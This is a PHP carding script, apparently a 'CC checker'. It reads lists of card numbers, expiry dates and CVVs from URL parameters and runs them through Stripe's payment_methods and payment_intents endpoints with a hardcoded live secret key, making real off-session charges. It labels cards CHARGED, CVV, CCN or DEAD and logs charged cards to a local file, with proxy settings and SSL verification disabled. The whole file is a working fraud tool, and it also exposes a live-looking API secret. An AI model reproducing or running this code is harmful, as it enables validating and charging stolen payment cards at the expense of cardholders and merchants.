<?php




error_reporting(0);
date_default_timezone_set('America/Buenos_Aires');


//================ [ FUNCTIONS & LISTA ] ===============//

function GetStr($string, $start, $end){
    $string = ' ' . $string;
    $ini = strpos($string, $start);
    if ($ini == 0) return '';
    $ini += strlen($start);
    $len = strpos($string, $end, $ini) - $ini;
    return trim(strip_tags(substr($string, $ini, $len)));
}


function multiexplode($seperator, $string){
    $one = str_replace($seperator, $seperator[0], $string);
    $two = explode($seperator[0], $one);
    return $two;
    };

$chr = $_GET['cst'];
 $option = $_GET['option'];
if(empty($chr)) {
$chr = '1';
}
$chk = $chr*100;

$sk = $_GET['sec'];
if(empty($sk)) {
$sk = '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';
}
$skk = $sk;

$lista = $_GET['lista'];
    $cc = multiexplode(array(":", "|", ""), $lista)[0];
    $mes = multiexplode(array(":", "|", ""), $lista)[1];
    $ano = multiexplode(array(":", "|", ""), $lista)[2];
    $cvv = multiexplode(array(":", "|", ""), $lista)[3];

if (strlen($mes) == 1) $mes = "0$mes";
if (strlen($ano) == 2) $ano = "20$ano";


#-------------------[1st REQ]--------------------#
for ($retry = 0; $retry <= 100; $retry++)
{
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL,$url);
curl_setopt($ch, CURLOPT_PROXY, $proxy);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $proxyauth);
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_methods');
curl_setopt($ch, CURLOPT_USERPWD, $skk. ':' . '');
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&card[number]='.$cc.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&card[cvc]=');

$payments = curl_exec($ch); 
curl_close($ch);

$tok1 = Getstr($payments,'"id": "','"');

$payment_decode = json_decode($payments, 1);
$payment_id = $payment_decode['id'];
$payment_error_code = $payment_decode['error']['code'];
$payment_decline_code = $payment_decode['error']['decline_code'];
$payment_message = $payment_decode['error']['message'];
$payment_cvc_check = $payment_decode['card']['cvc_check'];

if ($payment_error_code != 'rate_limit') {
    break;
}
}
#-------------------[2nd REQ]--------------------#
for ($retry = 0; $retry <= 100; $retry++)
{
if (isset($payment_id)) {
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL,$url);
curl_setopt($ch, CURLOPT_PROXY, $proxy);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $proxyauth);
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_intents');
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_USERPWD, $skk. ':' . '');
curl_setopt($ch, CURLOPT_POSTFIELDS, 'amount='.$chk.'&currency=eur&payment_method_types[]=card&description=HaileyKen CHK&payment_method='.$tok1.'&confirm=true&off_session=true');
$intents = curl_exec($ch); 
curl_close($ch);

$intent_decode = json_decode($intents, 1);
$intent_id = $intent_decode['id'];
$intent_error_code = $intent_decode['error']['code'];
$intent_decline_code = $intent_decode['error']['decline_code'];
$intent_message = $intent_decode['error']['message'];



}
if ($intent_error_code != 'rate_limit') {
    break;
}
}

#################
$receipturl = trim(strip_tags(getStr($intents,'"receipt_url": "','"')));
$receipt_url = Getstr($intents,'"receipt_url": "','"');

$cvcpass = Getstr($intents,'"cvc_check": "','"');

$country = Getstr($intents,'"country": "','"');

##========[RESPONSE CURL]========##

if (strpos($intents, '"status": "succeeded"')) {
    echo 'CHARGED</span>  </span>:  '.$lista.'</span>  <br>➤ Charged :€'.$chr.'  <br> ➤ Receipt : <a class="receipt" href="'.$receipturl.'">Here</a> - </p>';
    fwrite(fopen('ccncharge489.txt', 'a'), $lista."\r\n");
exit;
}


if (strpos($intents, '"cvc_check": "pass"')) {
    echo "<font color=darkblue> CVV [$lista]<br>[cvc_check:$cvcpass][$intent_decline_code][C:$country][R:$retry]<br>";
    die();
}

if (strpos($intents, '"status": "requires_source_action"')) {

    echo "<font color=red>DEAD  $listta [requires_source_action][OTP BIN][C:$country][R:$retry]<br>";

    die();
}

if (strpos($intents, '"status": "requires_action"')) {
    echo "<font color=red>DEAD  [$lista]<br>[requires_action][OTP BIN][C:$country][R:$retry]<br>";
    die();
}




if (!$payment_id) {
    if ($payment_error_code == 'insufficient_funds') {
        echo "<font color=green>CVV  [$lista]<br>[$payment_error_code]  [C:$country][R:$retry]<br>";
        die();
    }
    else if ($payment_decline_code == 'insufficient_funds') {
        echo "<font color=green>CVV  [$lista]<br>[$payment_decline_code]  [C:$country][R:$retry]<br>";
        die();
    }
    else if ($payment_error_code == 'invalid_cvc') {
        echo "<font color=lightblue>CCN  [$lista]<br>[$payment_message]  [C:$country][R:$retry]<br>";
        die();
    }
    else if (strpos($payments, 'Invalid API Key provided')) {
        echo "<font color=red>DEAD  [$lista]<br>[Invalid API Key provided] [C:$country][R:$retry]<br>";
        die();
    }
    else if (!$payment_decline_code) {
        echo "<font color=red>DEAD  [$lista]<br>[$payment_message]  [C:$country][R:$retry]<br>";
        die();
    }
    else {
        echo "<font color=red>DEAD  [$lista]<br>[$payment_decline_code]  [C:$country][R:$retry]<br>";
        die();
    }
    die();
}




if (!$intent_id) {
    if ($intent_error_code == 'insufficient_funds') {
        echo "<font color=green>CVV  [$lista]<br>[$intent_error_code]  [C:$country][R:$retry]<br>";
        die();
    }
    else if ($intent_decline_code == 'insufficient_funds') {
        echo "<font color=green>CVV  [$lista]<br>[$intent_decline_code]  [C:$country][R:$retry]<br>";
        die();
    }
    if ($intent_error_code == 'transaction_not_allowed') {
        echo "CVV  [$lista]<br>[$intent_error_code]  [C:$country][R:$retry]<br>";
        die();
    }
    if ($intent_error_code == 'incorrect_cvc') {
        echo "<font color=purple>CCN  [$lista]<br>[$intent_message]  [C:$country][R:$retry]<br>";
        die();
    }
    else if (!$intent_decline_code) {
        echo "<font color=red>DEAD  [$lista]<br>[$intent_error_code]  [C:$country][R:$retry]<br>"; 
        die();
    }
    else {
        echo "<font color=red><font color=red>DEAD  [$lista]<br>[$intent_decline_code] [C:$country][R:$retry]<br>"; 
        die();
    }
    die();
}


curl_close($ch);
ob_flush();
?>